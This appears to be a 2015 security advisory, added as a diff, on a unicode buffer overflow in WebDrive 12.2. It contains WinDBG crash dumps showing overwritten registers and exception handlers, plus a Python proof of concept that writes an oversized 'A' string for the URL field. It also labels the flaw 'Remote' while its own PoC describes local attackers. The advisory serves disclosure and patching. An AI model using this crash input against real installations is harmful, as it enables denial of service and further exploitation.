@@ -1,0 +1,273 @@
+Document Title:
+===============
+WebDrive 12.2 (B4172) - Buffer Overflow Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1500
+
+
+Release Date:
+=============
+2015-06-01
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1500
+
+
+Common Vulnerability Scoring System:
+====================================
+6.8
+
+
+Product & Service Introduction:
+===============================
+Unlike a typical FTP client, WebDrive allows you to open and edit server-based, files without the additional step of downloading the file. 
+Using a simple wizard, you assign a network drive letter to the FTP Server. WebDrive supports additional protocols such as WebDAV, SFTP and 
+Amazon S3 and maps a drive letter to each of these servers.You can map unique drive letters to multiple servers.Download the 
+full-function 20-day trial of WebDrive and  make file management on remote servers easier and more efficient!
+
+(Copy of the Vendor Homepage: http://www.webdrive.com/products/webdrive/ )
+
+
+Abstract Advisory Information:
+==============================
+An independent vulnerability laboratory researcher discovered an unicode buffer overflow vulnerability in the official WebDrive v12.2 (Build 4172) 32 bit software.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-06-01: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+South River Technologies
+Product: WebDrive - Software 12.2 (Build 4172) 32 bit
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A buffer overflow software vulnerability has been discovered  in the official WebDrive v12.2 (Build 4172) 32 bit software.
+The buffer overflow vulnerability allows to include unicode strings to basic code inputs from a system user account to compromise the software process or system.
+
+A fail to sanitize the input of the URL/Address results in compromise of the software system process. Attackers are able to 
+include large unicode strings to overwrite the registers like eip, ebp and co. WebDrive connects to many types of web servers, 
+as well as servers in the cloud. You can use WebDrive to access your files on all of the following server types and protocols:
+
+WebDAV ------------>Vulnerable
+WebDAV over SSL---->Vulnerable
+FTP---------------->Vulnerable
+FTP over SSL------->Vulnerable
+Amazon S3---------->Vulnerable
+SFTP--------------->Vulnerable
+FrontPage Server--->Vulnerable
+
+The security risk of the buffer overflow vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.8. 
+Exploitation of the vulnerability requires a low privilege system user account and no user interaction. Successful exploitation of the vulnerability 
+results in system compromise by elevation of privileges via overwrite of the registers.
+
+Vulnerable Module(s):
+						[+] URL/Address
+
+Note: Unlike a typical FTP client, WebDrive allows you to open and edit server-based, files without the additional step of downloading the file. 
+Using a simple wizard, you assign a network drive letter to the FTP Server. WebDrive supports additional protocols such as WebDAV, SFTP and Amazon S3 and 
+maps a drive letter to each of these servers.You can map unique drive letters to multiple servers. Download the full-function 20-day trial of WebDrive and 
+make file management on remote servers easier and more efficient!
+
+
+Proof of Concept (PoC):
+=======================
+The buffer overflow web vulnerability can be exploited by local attackers with low privilege system user account and without user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+Manual steps to reproduce the vulnerability ...
+1. Copy the AAAA...string from WebDrive.txt to clipboard
+2. Create a connection 
+3. Paste it in the URL/Address and attempt to connect.
+
+
+--- Crash Analysis using WinDBG: [WebDAV] ---
+(430.9f8): Access violation - code c0000005 (!!! second chance !!!)
+eax=001cad5c ebx=02283af8 ecx=00000041 edx=02289d9c esi=fdf47264 edi=001cad5c
+eip=0055ff2b esp=001c8cfc ebp=001c8d00 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\WebDrive\webdrive.exe
+webdrive+0x30ff2b:
+0055ff2b 66890c16        mov     word ptr [esi+edx],cx    ds:0023:001d1000=????
+0:000> !exchain
+001c8d20: webdrive+35a24e (005aa24e)
+001cb768: webdrive+1c0041 (00410041)
+Invalid exception stack at 00410041
+0:000> d 001cb768
+001cb768  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb778  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb788  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb798  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb7a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb7b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb7c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+001cb7d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
+
+WebDAV over SSL
+============================
+Crash Analysis using WinDBG:
+============================
+(b88.ca0): Access violation - code c0000005 (!!! second chance !!!)
+eax=00000000 ebx=00000000 ecx=00410041 edx=775e660d esi=00000000 edi=00000000
+eip=00410041 esp=000a1238 ebp=000a1258 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\ipworks9.dll - 
+ipworks9!IPWorks_SNPP_Get+0x57f:
+00410041 038d4df0e8da    add     ecx,dword ptr [ebp-25170FB3h] ss:0023:daf302a5=????????
+0:000>!exchain
+Invalid exception stack at 00410041
+
+FTP and FTP over SSL
+============================
+Crash Analysis using WinDBG:
+============================
+(834.70c): Access violation - code c0000005 (!!! second chance !!!)
+eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002d84f0 edi=00000000
+eip=775e64f4 esp=002d8488 ebp=002d84dc iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+ntdll!KiFastSystemCallRet:
+775e64f4 c3              ret
+0:000> !exchain
+002d8c1c: webdrive+35a24e (015da24e)
+002db664: 00410041
+Invalid exception stack at 00410041
+
+Amazon S3
+============================
+Crash Analysis using WinDBG:
+============================
+(a64.a98): Access violation - code c0000005 (!!! second chance !!!)
+eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002f8550 edi=00000000
+eip=775e64f4 esp=002f84e8 ebp=002f853c iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+ntdll!KiFastSystemCallRet:
+775e64f4 c3              ret
+0:000> !exchain
+002f8c7c: webdrive+35a24e (015da24e)
+002fb6c4: 00410041
+Invalid exception stack at 00410041
+
+SFTP
+============================
+Crash Analysis using WinDBG:
+============================
+(848.9a8): Access violation - code c0000005 (!!! second chance !!!)
+eax=00000000 ebx=00410041 ecx=00000400 edx=00000000 esi=002380f8 edi=00000000
+eip=775e64f4 esp=00238090 ebp=002380e4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+ntdll!KiFastSystemCallRet:
+775e64f4 c3              ret
+0:000> !exchain
+00238824: webdrive+35a24e (015da24e)
+0023b26c: 00410041
+Invalid exception stack at 00410041
+
+FrontPage Server
+============================
+Crash Analysis using WinDBG:
+============================
+(cd4.710): Access violation - code c0000005 (!!! second chance !!!)
+eax=007ba9f0 ebx=05d29738 ecx=00000041 edx=05d2fd48 esi=faa912b8 edi=007ba9f0
+eip=003bff2b esp=007b8990 ebp=007b8994 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\WebDrive\webdrive.exe
+webdrive+0x30ff2b:
+003bff2b 66890c16        mov     word ptr [esi+edx],cx    ds:0023:007c1000=????
+0:000> !exchain
+007b89b4: webdrive+35a24e (0040a24e)
+007bb3fc: webdrive+360041 (00410041)
+Invalid exception stack at 00410041
+'''
+
+
+PoC: Exploitcode
+buffer="http://"
+buffer+="\x41" * 70000
+off=buffer
+
+try:
+	out_file = open("WebDrive.txt",'w')
+	out_file.write(off)
+	out_file.close()
+	print("[*] Malicious txt file created successfully")
+except:
+	print "[!] Error creating file"
+
+
+Reference(s):
+http://www.webdrive.com/products/webdrive/
+https://www.webdrive.com/products/webdrive/download/
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by a secure parse and input restriction of the vulnerable URL/Adress parameters.
+
+
+Security Risk:
+==============
+The security risk of the buffer overflow vulnerability in the URL/Address parameter is estimated as high. (CVSS 6.8)
+
+
+Credits & Authors:
+==================
+metacom
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
